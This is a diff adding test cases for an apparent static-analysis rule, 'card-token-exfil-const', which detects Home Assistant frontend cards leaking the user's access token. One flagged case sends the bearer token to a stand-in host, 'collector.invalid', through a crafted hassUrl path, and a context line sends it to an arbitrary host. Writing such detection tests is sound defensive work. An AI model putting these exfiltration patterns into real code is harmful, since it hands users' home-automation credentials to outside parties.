@@ -42,3 +42,20 @@ function destructuredShadow(hass, { C }) {
   // todook: card-token-exfil-const
   fetch(C + "/x", { headers: { Authorization: hass.auth.data.access_token } });
 }
+
+// (0.15) hassUrl(path): only a path that starts with "/", "?" or "#" stays on HA.
+function hassUrlPathsConst(hass) {
+  const token = hass.auth.data.access_token;
+  // ok: card-token-exfil-const
+  fetch(hass.hassUrl("/api/x"), { headers: { Authorization: `Bearer ${token}` } });
+  // ruleid: card-token-exfil-const
+  fetch(hass.hassUrl("@collector.invalid/c"), { headers: { Authorization: `Bearer ${token}` } });
+}
+
+// (0.15) A blob: address never leaves the browser.
+async function blobFromHaConst(hass) {
+  const token = hass.auth.data.access_token;
+  const r = await fetch("/api/acme/doc", { headers: { Authorization: `Bearer ${token}` } });
+  // ok: card-token-exfil-const
+  window.open(URL.createObjectURL(await r.blob()), "_blank");
+}
